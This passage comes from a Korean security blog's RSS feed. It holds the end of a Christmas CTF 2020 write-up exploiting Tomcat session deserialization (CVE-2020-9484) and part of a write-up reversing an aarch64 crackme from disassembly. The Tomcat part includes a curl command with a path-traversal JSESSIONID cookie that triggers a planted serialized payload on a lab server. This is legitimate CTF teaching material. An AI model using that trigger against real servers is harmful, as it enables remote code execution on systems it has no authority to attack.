class="hljs-meta">$1</span><span class="hljs-built_in">WARNING</span>: Use <span class="hljs-comment">--illegal-access=warn to enable warnings of further illegal reflective access operations</span><span class="hljs-built_in">WARNING</span>: <span class="hljs-keyword">All</span> illegal <span class="hljs-keyword">access</span> operations will be denied <span class="hljs-keyword">in</span> a future <span class="hljs-keyword">release</span></code></pre><ul><li>해당 session file으로 접근</li></ul><pre><code class="hljs xml">idioth@ubuntu:~$ curl &#x27;http://192.168.48.128/index.jsp&#x27; -H &#x27;Cookie:JSESSIONID=../media/gift/test/exploit&#x27;<span class="hljs-meta">&lt;!doctype <span class="hljs-meta-keyword">html</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>HTTP Status 500 – Internal Server Error<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/css&quot;</span>&gt;</span><span class="css"><span class="hljs-selector-tag">body</span> &#123;<span class="hljs-attribute">font-family</span>:Tahoma,Arial,sans-serif;&#125; <span class="hljs-selector-tag">h1</span>, <span class="hljs-selector-tag">h2</span>, <span class="hljs-selector-tag">h3</span>, <span class="hljs-selector-tag">b</span> &#123;<span class="hljs-attribute">color</span>:white;<span class="hljs-attribute">background-color</span>:<span class="hljs-number">#525D76</span>;&#125; <span class="hljs-selector-tag">h1</span> &#123;<span class="hljs-attribute">font-size</span>:<span class="hljs-number">22px</span>;&#125; <span class="hljs-selector-tag">h2</span> &#123;<span class="hljs-attribute">font-size</span>:<span class="hljs-number">16px</span>;&#125; <span class="hljs-selector-tag">h3</span> &#123;<span class="hljs-attribute">font-size</span>:<span class="hljs-number">14px</span>;&#125; <span class="hljs-selector-tag">p</span> &#123;<span class="hljs-attribute">font-size</span>:<span class="hljs-number">12px</span>;&#125; <span class="hljs-selector-tag">a</span> &#123;<span class="hljs-attribute">color</span>:black;&#125; <span class="hljs-selector-class">.line</span> &#123;<span class="hljs-attribute">height</span>:<span class="hljs-number">1px</span>;<span class="hljs-attribute">background-color</span>:<span class="hljs-number">#525D76</span>;<span class="hljs-attribute">border</span>:none;&#125;</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>HTTP Status 500 – Internal Server Error<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></code></pre><p><img src="/2020/12/29/idioth/christmasctf2020-gift/image19.png"></p><p><img src="/2020/12/29/idioth/christmasctf2020-gift/image20.png"></p><p>XMAS{0mg_u_f1nd_a_sp3cia1_g1ft!!}</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Write-Up/">Write-Up</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/rce/">rce</category>
      
      <category domain="https://hackyboiz.github.io/tags/ctf/">ctf</category>
      
      <category domain="https://hackyboiz.github.io/tags/idioth/">idioth</category>
      
      <category domain="https://hackyboiz.github.io/tags/tomcat/">tomcat</category>
      
      <category domain="https://hackyboiz.github.io/tags/christmas-ctf-2020/">christmas ctf 2020</category>
      
      <category domain="https://hackyboiz.github.io/tags/web/">web</category>
      
      <category domain="https://hackyboiz.github.io/tags/lfi/">lfi</category>
      
      <category domain="https://hackyboiz.github.io/tags/cve-2020-9484/">cve-2020-9484</category>
      
      
      <comments>https://hackyboiz.github.io/2020/12/29/idioth/christmasctf2020-gift/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Write-Up] Christmas CTF 2020 - lock</title>
      <link>https://hackyboiz.github.io/2020/12/29/idioth/christmasctf2020-lock/</link>
      <guid>https://hackyboiz.github.io/2020/12/29/idioth/christmasctf2020-lock/</guid>
      <pubDate>Tue, 29 Dec 2020 12:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;출제-의도&quot;&gt;&lt;a href=&quot;#출제-의도&quot; class=&quot;headerlink&quot; title=&quot;출제 의도&quot;&gt;&lt;/a&gt;출제 의도&lt;/h1&gt;&lt;p&gt;baby_crackme를 하나 간단하게 내고 싶었는데 arm으로 내면 어떨까? 싶어서 낸 문제입니다.&lt;/</description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="출제-의도"><a href="#출제-의도" class="headerlink" title="출제 의도"></a>출제 의도</h1><p>baby_crackme를 하나 간단하게 내고 싶었는데 arm으로 내면 어떨까? 싶어서 낸 문제입니다.</p><h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><p>dump로 파일이 하나 주어지며 vscode나 메모장 등으로 열면 아래와 같은 dump 코드가 나옵니다.</p><p><img src="/2020/12/29/idioth/christmasctf2020-lock/image0.png"></p><p>aarch64에서 동작하는 바이너리이며 Input 값을 통해 어떠한 연산을 수행하는 것으로 볼 수 있습니다.</p><pre><code class="hljs llvm"><span class="hljs-number">0000000000000</span><span class="hljs-keyword">c</span><span class="hljs-number">50</span> &lt;main&gt;: <span class="hljs-keyword">c</span><span class="hljs-number">50</span>:   a<span class="hljs-number">9</span>be<span class="hljs-number">7</span>bfd    stp <span class="hljs-keyword">x</span><span class="hljs-number">29</span>, <span class="hljs-keyword">x</span><span class="hljs-number">30</span>, [sp, #<span class="hljs-number">-32</span>]! <span class="hljs-keyword">c</span><span class="hljs-number">54</span>:   <span class="hljs-number">910003</span>fd    mov <span class="hljs-keyword">x</span><span class="hljs-number">29</span>, sp <span class="hljs-keyword">c</span><span class="hljs-number">58</span>:   d<span class="hljs-number">2800021</span>    mov <span class="hljs-keyword">x</span><span class="hljs-number">1</span>, <span class="hljs-symbol">#0</span><span class="hljs-keyword">x</span><span class="hljs-number">1</span>                    // <span class="hljs-symbol">#1</span> <span class="hljs-keyword">c</span><span class="hljs-number">5</span><span class="hljs-keyword">c</span>:   d<span class="hljs-number">2800260</span>    mov <span class="hljs-keyword">x</span><span class="hljs-number">0</span>, <span class="hljs-symbol">#0</span><span class="hljs-keyword">x</span><span class="hljs-number">13</span>                   // <span class="hljs-symbol">#19</span> <span class="hljs-keyword">c</span><span class="hljs-number">60</span>:   <span class="hljs-number">97</span>fffee<span class="hljs-number">0</span>    bl  <span class="hljs-number">7e0</span> &lt;calloc<span class="hljs-title">@plt</span>&gt; <span class="hljs-keyword">c</span><span class="hljs-number">64</span>:   f<span class="hljs-number">9000</span>be<span class="hljs-number">0</span>    str <span class="hljs-keyword">x</span><span class="hljs-number">0</span>, [sp, <span class="hljs-symbol">#16</span>] <span class="hljs-keyword">c</span><span class="hljs-number">68</span>:   <span class="hljs-number">97</span>ffff<span class="hljs-number">94</span>    bl  ab<span class="hljs-number">8</span> &lt;sub_ab<span class="hljs-number">8</span>&gt; <span class="hljs-keyword">c</span><span class="hljs-number">6</span><span class="hljs-keyword">c</span>:   <span class="hljs-number">97</span>ffff<span class="hljs-number">51</span>    bl  <span class="hljs-number">9</span>b<span class="hljs-number">0</span> &lt;sub_<span class="hljs-number">9</span>b<span class="hljs-number">0</span>&gt; <span class="hljs-keyword">c</span><span class="hljs-number">70</span>:   f<span class="hljs-number">9000</span>fe<span class="hljs-number">0</span>    str <span class="hljs-keyword">x</span><span class="hljs-number">0</span>, [sp, <span class="hljs-symbol">#24</span>] <span class="hljs-keyword">c</span><span class="hljs-number">74</span>:   <span class="hljs-number">97</span>ffff<span class="hljs-number">3</span>e    bl  <span class="hljs-number">96</span><span class="hljs-keyword">c</span> &lt;sub_<span class="hljs-number">96</span><span class="hljs-keyword">c</span>&gt; <span class="hljs-keyword">c</span><span class="hljs-number">78</span>:   f<span class="hljs-number">9400</span>be<span class="hljs-number">1</span>    ldr <span class="hljs-keyword">x</span><span class="hljs-number">1</span>, [sp, <span class="hljs-symbol">#16</span>] <span class="hljs-keyword">c</span><span class="hljs-number">7</span><span class="hljs-keyword">c</span>:   <span class="hljs-number">90000000</span>    adrp    <span class="hljs-keyword">x</span><span class="hljs-number">0</span>, <span class="hljs-number">0</span> &lt;_init<span class="hljs-number">-0</span><span class="hljs-keyword">x</span><span class="hljs-number">760</span>&gt; <span class="hljs-keyword">c</span><span class="hljs-number">80</span>:   <span class="hljs-number">9138</span>a<span class="hljs-number">000</span>    <span class="hljs-keyword">add</span> <span class="hljs-keyword">x</span><span class="hljs-number">0</span>, <span class="hljs-keyword">x</span><span class="hljs-number">0</span>, <span class="hljs-symbol">#0</span>xe<span class="hljs-number">28</span>              // <span class="hljs-symbol">#0</span>xe<span class="hljs-number">28</span> &#x27;<span class="hljs-symbol">%s</span>&#x27; <span class="hljs-keyword">c</span><span class="hljs-number">84</span>:   <span class="hljs-number">97</span>fffeeb    bl  <span class="hljs-number">830</span> &lt;__isoc<span class="hljs-number">99</span>_scanf<span class="hljs-title">@plt</span>&gt; <span class="hljs-keyword">c</span><span class="hljs-number">88</span>:   f<span class="hljs-number">9400</span>fe<span class="hljs-number">1</span>    ldr <span class="hljs-keyword">x</span><span class="hljs-number">1</span>, [sp, <span class="hljs-symbol">#24</span>] <span class="hljs-keyword">c</span><span class="hljs-number">8</span><span class="hljs-keyword">c</span>:   f<span class="hljs-number">9400</span>be<span class="hljs-number">0</span>    ldr <span class="hljs-keyword">x</span><span class="hljs-number">0</span>, [sp, <span class="hljs-symbol">#16</span>] <span class="hljs-keyword">c</span><span class="hljs-number">90</span>:   <span class="hljs-number">97</span>ffffa<span class="hljs-number">8</span>    bl  b<span class="hljs-number">30</span> &lt;sub_b<span class="hljs-number">30</span>&gt; <span class="hljs-keyword">c</span><span class="hljs-number">94</span>:   f<span class="hljs-number">9400</span>be<span class="hljs-number">0</span>    ldr <span class="hljs-keyword">x</span><span class="hljs-number">0</span>, [sp, <span class="hljs-symbol">#16</span>] <span class="hljs-keyword">c</span><span class="hljs-number">98</span>:   <span class="hljs-number">97</span>fffee<span class="hljs-number">2</span>    bl  <span class="hljs-number">820</span> &lt;<span class="hljs-keyword">free</span><span class="hljs-title">@plt</span>&gt; <span class="hljs-keyword">c</span><span class="hljs-number">9</span><span class="hljs-keyword">c</span>:   <span class="hljs-number">52800000</span>    mov w<span class="hljs-number">0</span>, <span class="hljs-symbol">#0</span><span class="hljs-keyword">x</span><span class="hljs-number">0</span>                    // <span class="hljs-symbol">#0</span> ca<span class="hljs-number">0</span>:   a<span class="hljs-number">8</span><span class="hljs-keyword">c</span><span class="hljs-number">27</span>bfd    ldp <span class="hljs-keyword">x</span><span class="hljs-number">29</span>, <span class="hljs-keyword">x</span><span class="hljs-number">30</span>, [sp], <span class="hljs-symbol">#32</span> ca<span class="hljs-number">4</span>:   d<span class="hljs-number">65</span>f<span class="hljs-number">03</span><span class="hljs-keyword">c</span><span class="hljs-number">0</span>    <span class="hljs-keyword">ret</span></code></pre><p>main 함수를 보면 <code>sp + #16</code>에 calloc(0x13,1)을 해주고 <code>sub_ab8</code>함수가 호출된 후 나온 값을 인자로 <code>sub_9b0</code> 함수가 실행된 후 <code>sp + #24</code>에 저장합니다. 그 후 <code>sub_96c</code> 함수를 호출하고 값을 받아서<code>sp+#16</code>에 넣어주고  <code>sub_9b0(sub_ab8())</code> 한 값과 input 값을 인자로 <code>sub_b30</code> 함수를 호출하고 프로그램이 종료됩니다. 해당 함수를 c 코드로 간단하게 나타내면 아래와 같습니다.</p><pre><code class="hljs c"><span class="hljs-comment">// main</span><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>&#123;    <span class="hljs-keyword">char</span> *var1 = <span class="hljs-built_in">calloc</span>(<span class="hljs-number">0x13</span>, <span class="hljs-number">1</span>);    <span class="hljs-keyword">int</span> var2 = sub_9b0(sub_ab8());    sub_96c();    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>, var1);    sub_b30(var1, var2);    <span class="hljs-built_in">free</span>(var1);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><p><code>sub_ab8</code>과 <code>sub_9b0</code> 함수를 살펴봅시다.</p><pre><code class="hljs apache"><span class="hljs-attribute">value0</span>  DCB <span class="hljs-number">0</span>x<span class="hljs-number">96</span>, <span class="hljs-number">0</span>x<span class="hljs-number">19</span>, <span class="hljs-number">0</span>x<span class="hljs-number">7</span>, <span class="hljs-number">0</span>x<span class="hljs-number">11</span>, <span class="hljs-number">0</span>x<span class="hljs-number">99</span>, <span class="hljs-number">0</span>x<span class="hljs-number">19</span>, <span class="hljs-number">0</span>x<span class="hljs-number">2</span>, <span class="hljs-number">0</span>x<span class="hljs-number">11</span><span class="hljs-attribute">value1</span>  DCB <span class="hljs-number">0</span>xF<span class="hljs-number">7</span>, <span class="hljs-number">0</span>x<span class="hljs-number">7</span>B, <span class="hljs-number">0</span>x<span class="hljs-number">64</span>, <span class="hljs-number">0</span>x<span class="hljs-number">75</span>, <span class="hljs-number">0</span>xFC, <span class="hljs-number">0</span>x<span class="hljs-number">7</span>F, <span class="hljs-number">0</span>x<span class="hljs-number">65</span>, <span class="hljs-number">0</span>x<span class="hljs-number">79</span>, <span class="hljs-number">0</span>xFF,<span class="hljs-attribute">0x73</span>, <span class="hljs-number">0</span>x<span class="hljs-number">6</span>C, <span class="hljs-number">0</span>x<span class="hljs-number">7</span>D, <span class="hljs-number">0</span>xF<span class="hljs-number">4</span>, <span class="hljs-number">0</span>x<span class="hljs-number">77</span>, <span class="hljs-number">0</span>x<span class="hljs-number">6</span>D, <span class="hljs-number">0</span>x<span class="hljs-number">61</span>, <span class="hljs-number">0</span>xE<span class="hljs-number">7</span>, <span class="hljs-number">0</span>x<span class="hljs-number">6</span>B, <span class="hljs-number">0</span>x<span class="hljs-number">74</span>, <span class="hljs-number">0</span>x<span class="hljs-number">65</span>,<span class="hljs-attribute">0xEC</span>, <span class="hljs-number">0</span>x<span class="hljs-number">6</span>F, <span class="hljs-number">0</span>x<span class="hljs-number">75</span>, <span class="hljs-number">0</span>x<span class="hljs-number">69</span>, <span class="hljs-number">0</span>xEF, <span class="hljs-number">0</span>x<span class="hljs-number">63</span>, <span class="hljs-number">0</span>x<span class="hljs-number">46</span>, <span class="hljs-number">0</span>x<span class="hljs-number">53</span>, <span class="hljs-number">0</span>xDA, <span class="hljs-number">0</span>x<span class="hljs-number">5</span>D, <span class="hljs-number">0</span>x<span class="hljs-number">47</span>,<span class="hljs-attribute">0x57</span>, <span class="hljs-number">0</span>xD<span class="hljs-number">1</span>, <span class="hljs-number">0</span>x<span class="hljs-number">51</span>, <span class="hljs-number">0</span>x<span class="hljs-number">4</span>E, <span class="hljs-number">0</span>x<span class="hljs-number">5</span>B, <span class="hljs-number">0</span>xD<span class="hljs-number">2</span>, <span class="hljs-number">0</span>x<span class="hljs-number">55</span>, <span class="hljs-number">0</span>x<span class="hljs-number">4</span>F, <span class="hljs-number">0</span>x<span class="hljs-number">5</span>F, <span class="hljs-number">0</span>xD<span class="hljs-number">9</span>, <span class="hljs-number">0</span>x<span class="hljs-number">49</span>, <span class="hljs-number">0</span>x<span class="hljs-number">56</span>,<span class="hljs-attribute">0x43</span>, <span class="hljs-number">0</span>xCA, <span class="hljs-number">0</span>x<span class="hljs-number">4</span>D, <span class="hljs-number">0</span>x<span class="hljs-number">57</span>, <span class="hljs-number">0</span>x<span class="hljs-number">47</span>, <span class="hljs-number">0</span>xC<span class="hljs-number">1</span>, <span class="hljs-number">0</span>x<span class="hljs-number">41</span>, <span class="hljs-number">0</span>x<span class="hljs-number">5</span>E, <span class="hljs-number">0</span>x<span class="hljs-number">4</span>B, <span class="hljs-number">0</span>xA<span class="hljs-number">9</span>, <span class="hljs-number">0</span>x<span class="hljs-number">28</span>, <span class="hljs-number">0</span>x<span class="hljs-number">30</span>,<span class="hljs-attribute">0x22</span>, <span class="hljs-number">0</span>xA<span class="hljs-number">2</span>, <span class="hljs-number">0</span>x<span class="hljs-number">2</span>C, <span class="hljs-number">0</span>x<span class="hljs-number">31</span>, <span class="hljs-number">0</span>x<span class="hljs-number">26</span>, <span class="hljs-number">0</span>xA<span class="hljs-number">1</span>, <span class="hljs-number">0</span>x<span class="hljs-number">20</span><span class="hljs-attribute">0000000000000ab8</span> &lt;sub_ab<span class="hljs-number">8</span>&gt;: <span class="hljs-attribute">ab8</span>:   a<span class="hljs-number">9</span>be<span class="hljs-number">7</span>bfd    stp x<span class="hljs-number">29</span>, x<span class="hljs-number">30</span>,<span class="hljs-meta"> [sp, #-32]!</span><span class="hljs-meta"> abc:   910003fd    mov x29, sp</span><span class="hljs-meta"> ac0:   52800103    mov w3, #0x8                    // #8</span><span class="hljs-meta"> ac4:   90000000    adrp    x0, value0@page</span><span class="hljs-meta"> ac8:   9136e002    add x2, x0, value0@pageoff</span><span class="hljs-meta"> acc:   528007c1    mov w1, #0x3e                   // #62</span><span class="hljs-meta"> ad0:   90000000    adrp    x0, value1@page</span><span class="hljs-meta"> ad4:   91372000    add x0, x0, value1@pageoff</span><span class="hljs-meta"> ad8:   97ffffc9    bl  9fc &lt;sub_9fc&gt;</span><span class="hljs-meta"> adc:   f9000fe0    str x0, [sp, #24]</span> <span class="hljs-attribute">ae0</span>:   f<span class="hljs-number">9400</span>fe<span class="hljs-number">0</span>    ldr x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #24]</span> <span class="hljs-attribute">ae4</span>:   a<span class="hljs-number">8</span>c<span class="hljs-number">27</span>bfd    ldp x<span class="hljs-number">29</span>, x<span class="hljs-number">30</span>,<span class="hljs-meta"> [sp], #32</span><span class="hljs-meta"> ae8:   d65f03c0    ret</span></code></pre><p>aarch64의 calling convention은 <code>x0</code>, <code>x1</code>, <code>x2</code>, <code>x3</code> 이므로 인자에 value1, 0x3e, value0, 0x8을 넣어 <code>sub_9fc</code>를 호출합니다. 호출하고 난 후 연산된 문자열을 return 해줍니다.</p><pre><code class="hljs apache"><span class="hljs-attribute">00000000000009b0</span> &lt;sub_<span class="hljs-number">9</span>b<span class="hljs-number">0</span>&gt;: <span class="hljs-attribute">9b0</span>:   a<span class="hljs-number">9</span>bd<span class="hljs-number">7</span>bfd    stp x<span class="hljs-number">29</span>, x<span class="hljs-number">30</span>,<span class="hljs-meta"> [sp, #-48]!</span><span class="hljs-meta"> 9b4:   910003fd    mov x29, sp</span><span class="hljs-meta"> 9b8:   f9000fe0    str x0, [sp, #24]</span> <span class="hljs-attribute">9bc</span>:   f<span class="hljs-number">9400</span>fe<span class="hljs-number">0</span>    ldr x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #24]</span> <span class="hljs-attribute">9c0</span>:   <span class="hljs-number">97</span>ffff<span class="hljs-number">78</span>    bl  <span class="hljs-number">7</span>a<span class="hljs-number">0</span> &lt;strlen@plt&gt; <span class="hljs-attribute">9c4</span>:   <span class="hljs-number">91000400</span>    add x<span class="hljs-number">0</span>, x<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>x<span class="hljs-number">1</span> <span class="hljs-attribute">9c8</span>:   <span class="hljs-number">97</span>ffff<span class="hljs-number">7</span>e    bl  <span class="hljs-number">7</span>c<span class="hljs-number">0</span> &lt;malloc@plt&gt; <span class="hljs-attribute">9cc</span>:   f<span class="hljs-number">90017</span>e<span class="hljs-number">0</span>    str x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #40]</span> <span class="hljs-attribute">9d0</span>:   f<span class="hljs-number">94017</span>e<span class="hljs-number">0</span>    ldr x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #40]</span> <span class="hljs-attribute">9d4</span>:   f<span class="hljs-number">100001</span>f    cmp x<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>x<span class="hljs-number">0</span> <span class="hljs-attribute">9d8</span>:   <span class="hljs-number">54000061</span>    b.ne    <span class="hljs-number">9</span>e<span class="hljs-number">4</span> &lt;sub_<span class="hljs-number">9</span>b<span class="hljs-number">0</span>+<span class="hljs-number">0</span>x<span class="hljs-number">34</span>&gt;  // b.any <span class="hljs-attribute">9dc</span>:   d<span class="hljs-number">2800000</span>    mov x<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>x<span class="hljs-number">0</span>                // #<span class="hljs-number">0</span> <span class="hljs-attribute">9e0</span>:   <span class="hljs-number">14000005</span>    b   <span class="hljs-number">9</span>f<span class="hljs-number">4</span> &lt;sub_<span class="hljs-number">9</span>b<span class="hljs-number">0</span>+<span class="hljs-number">0</span>x<span class="hljs-number">44</span>&gt; <span class="hljs-attribute">9e4</span>:   f<span class="hljs-number">9400</span>fe<span class="hljs-number">1</span>    ldr x<span class="hljs-number">1</span>,<span class="hljs-meta"> [sp, #24]</span> <span class="hljs-attribute">9e8</span>:   f<span class="hljs-number">94017</span>e<span class="hljs-number">0</span>    ldr x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #40]</span> <span class="hljs-attribute">9ec</span>:   <span class="hljs-number">97</span>ffff<span class="hljs-number">95</span>    bl  <span class="hljs-number">840</span> &lt;strcpy@plt&gt; <span class="hljs-attribute">9f0</span>:   f<span class="hljs-number">94017</span>e<span class="hljs-number">0</span>    ldr x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #40]</span> <span class="hljs-attribute">9f4</span>:   a<span class="hljs-number">8</span>c<span class="hljs-number">37</span>bfd    ldp x<span class="hljs-number">29</span>, x<span class="hljs-number">30</span>,<span class="hljs-meta"> [sp], #48</span><span class="hljs-meta"> 9f8:   d65f03c0    ret</span></code></pre><p><code>sub_ab8</code>에서 반환한 문자열을 받아서 길이를 계산한 후 <code>malloc</code> 해줍니다. 할당한 주소가 0이라면 0을 반환해주고, 아니면 <code>strcpy</code>를 통해 <code>sub_ab8</code>에서 온 문자열을 복사하여 return 해줍니다.</p><p>이제 <code>sub_9fc</code> 함수를 분석을 해봅시다.</p><pre><code class="hljs apache"><span class="hljs-attribute">00000000000009fc</span> &lt;sub_<span class="hljs-number">9</span>fc&gt;: <span class="hljs-attribute">9fc</span>:   a<span class="hljs-number">9</span>bc<span class="hljs-number">7</span>bfd    stp x<span class="hljs-number">29</span>, x<span class="hljs-number">30</span>,<span class="hljs-meta"> [sp, #-64]!</span><span class="hljs-meta"> a00:   910003fd    mov x29, sp</span><span class="hljs-meta"> a04:   f90017e0    str x0, [sp, #40]</span> <span class="hljs-attribute">a08</span>:   b<span class="hljs-number">90027</span>e<span class="hljs-number">1</span>    str w<span class="hljs-number">1</span>,<span class="hljs-meta"> [sp, #36]</span> <span class="hljs-attribute">a0c</span>:   f<span class="hljs-number">9000</span>fe<span class="hljs-number">2</span>    str x<span class="hljs-number">2</span>,<span class="hljs-meta"> [sp, #24]</span> <span class="hljs-attribute">a10</span>:   b<span class="hljs-number">90023</span>e<span class="hljs-number">3</span>    str w<span class="hljs-number">3</span>,<span class="hljs-meta"> [sp, #32]</span> <span class="hljs-attribute">a14</span>:   b<span class="hljs-number">94027</span>e<span class="hljs-number">0</span>    ldr w<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #36]</span> <span class="hljs-attribute">a18</span>:   <span class="hljs-number">11000400</span>    add w<span class="hljs-number">0</span>, w<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>x<span class="hljs-number">1</span> <span class="hljs-attribute">a1c</span>:   <span class="hljs-number">93407</span>c<span class="hljs-number">00</span>    sxtw    x<span class="hljs-number">0</span>, w<span class="hljs-number">0</span> <span class="hljs-attribute">a20</span>:   <span class="hljs-number">97</span>ffff<span class="hljs-number">68</span>    bl  <span class="hljs-number">7</span>c<span class="hljs-number">0</span> &lt;malloc@plt&gt; <span class="hljs-attribute">a24</span>:   f<span class="hljs-number">9001</span>fe<span class="hljs-number">0</span>    str x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #56]</span> <span class="hljs-attribute">a28</span>:   b<span class="hljs-number">98027</span>e<span class="hljs-number">0</span>    ldrsw   x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #36]</span> <span class="hljs-attribute">a2c</span>:   f<span class="hljs-number">9401</span>fe<span class="hljs-number">1</span>    ldr x<span class="hljs-number">1</span>,<span class="hljs-meta"> [sp, #56]</span> <span class="hljs-attribute">a30</span>:   <span class="hljs-number">8</span>b<span class="hljs-number">000020</span>    add x<span class="hljs-number">0</span>, x<span class="hljs-number">1</span>, x<span class="hljs-number">0</span> <span class="hljs-attribute">a34</span>:   <span class="hljs-number">3900001</span>f    strb    wzr,<span class="hljs-meta"> [x0]</span> <span class="hljs-attribute">a38</span>:   b<span class="hljs-number">90037</span>ff    str wzr,<span class="hljs-meta"> [sp, #52]</span> <span class="hljs-attribute">a3c</span>:   <span class="hljs-number">14000018</span>    b   a<span class="hljs-number">9</span>c &lt;sub_<span class="hljs-number">9</span>fc+<span class="hljs-number">0</span>xa<span class="hljs-number">0</span>&gt; <span class="hljs-attribute">a40</span>:   b<span class="hljs-number">98037</span>e<span class="hljs-number">0</span>    ldrsw   x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #52]</span> <span class="hljs-attribute">a44</span>:   f<span class="hljs-number">94017</span>e<span class="hljs-number">1</span>    ldr x<span class="hljs-number">1</span>,<span class="hljs-meta"> [sp, #40]</span> <span class="hljs-attribute">a48</span>:   <span class="hljs-number">8</span>b<span class="hljs-number">000020</span>    add x<span class="hljs-number">0</span>, x<span class="hljs-number">1</span>, x<span class="hljs-number">0</span> <span class="hljs-attribute">a4c</span>:   <span class="hljs-number">39400002</span>    ldrb    w<span class="hljs-number">2</span>,<span class="hljs-meta"> [x0]</span> <span class="hljs-attribute">a50</span>:   b<span class="hljs-number">94037</span>e<span class="hljs-number">0</span>    ldr w<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #52]</span> <span class="hljs-attribute">a54</span>:   b<span class="hljs-number">94023</span>e<span class="hljs-number">1</span>    ldr w<span class="hljs-number">1</span>,<span class="hljs-meta"> [sp, #32]</span> <span class="hljs-attribute">a58</span>:   <span class="hljs-number">1</span>ac<span class="hljs-number">10</span>c<span class="hljs-number">03</span>    sdiv    w<span class="hljs-number">3</span>, w<span class="hljs-number">0</span>, w<span class="hljs-number">1</span> <span class="hljs-attribute">a5c</span>:   b<span class="hljs-number">94023</span>e<span class="hljs-number">1</span>    ldr w<span class="hljs-number">1</span>,<span class="hljs-meta"> [sp, #32]</span> <span class="hljs-attribute">a60</span>:   <span class="hljs-number">1</span>b<span class="hljs-number">017</span>c<span class="hljs-number">61</span>    mul w<span class="hljs-number">1</span>, w<span class="hljs-number">3</span>, w<span class="hljs-number">1</span> <span class="hljs-attribute">a64</span>:   <span class="hljs-number">4</span>b<span class="hljs-number">010000</span>    sub w<span class="hljs-number">0</span>, w<span class="hljs-number">0</span>, w<span class="hljs-number">1</span> <span class="hljs-attribute">a68</span>:   <span class="hljs-number">93407</span>c<span class="hljs-number">00</span>    sxtw    x<span class="hljs-number">0</span>, w<span class="hljs-number">0</span> <span class="hljs-attribute">a6c</span>:   f<span class="hljs-number">9400</span>fe<span class="hljs-number">1</span>    ldr x<span class="hljs-number">1</span>,<span class="hljs-meta"> [sp, #24]</span> <span class="hljs-attribute">a70</span>:   <span class="hljs-number">8</span>b<span class="hljs-number">000020</span>    add x<span class="hljs-number">0</span>, x<span class="hljs-number">1</span>, x<span class="hljs-number">0</span> <span class="hljs-attribute">a74</span>:   <span class="hljs-number">39400001</span>    ldrb    w<span class="hljs-number">1</span>,<span class="hljs-meta"> [x0]</span> <span class="hljs-attribute">a78</span>:   b<span class="hljs-number">98037</span>e<span class="hljs-number">0</span>    ldrsw   x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #52]</span> <span class="hljs-attribute">a7c</span>:   f<span class="hljs-number">9401</span>fe<span class="hljs-number">3</span>    ldr x<span class="hljs-number">3</span>,<span class="hljs-meta"> [sp, #56]</span> <span class="hljs-attribute">a80</span>:   <span class="hljs-number">8</span>b<span class="hljs-number">000060</span>    add x<span class="hljs-number">0</span>, x<span class="hljs-number">3</span>, x<span class="hljs-number">0</span> <span class="hljs-attribute">a84</span>:   <span class="hljs-number">4</span>a<span class="hljs-number">010041</span>    eor w<span class="hljs-number">1</span>, w<span class="hljs-number">2</span>, w<span class="hljs-number">1</span> <span class="hljs-attribute">a88</span>:   <span class="hljs-number">12001</span>c<span class="hljs-number">21</span>    and w<span class="hljs-number">1</span>, w<span class="hljs-number">1</span>, #<span class="hljs-number">0</span>xff <span class="hljs-attribute">a8c</span>:   <span class="hljs-number">39000001</span>    strb    w<span class="hljs-number">1</span>,<span class="hljs-meta"> [x0]</span> <span class="hljs-attribute">a90</span>:   b<span class="hljs-number">94037</span>e<span class="hljs-number">0</span>    ldr w<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #52]</span> <span class="hljs-attribute">a94</span>:   <span class="hljs-number">11000400</span>    add w<span class="hljs-number">0</span>, w<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>x<span class="hljs-number">1</span> <span class="hljs-attribute">a98</span>:   b<span class="hljs-number">90037</span>e<span class="hljs-number">0</span>    str w<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #52]</span> <span class="hljs-attribute">a9c</span>:   b<span class="hljs-number">94037</span>e<span class="hljs-number">1</span>    ldr w<span class="hljs-number">1</span>,<span class="hljs-meta"> [sp, #52]</span> <span 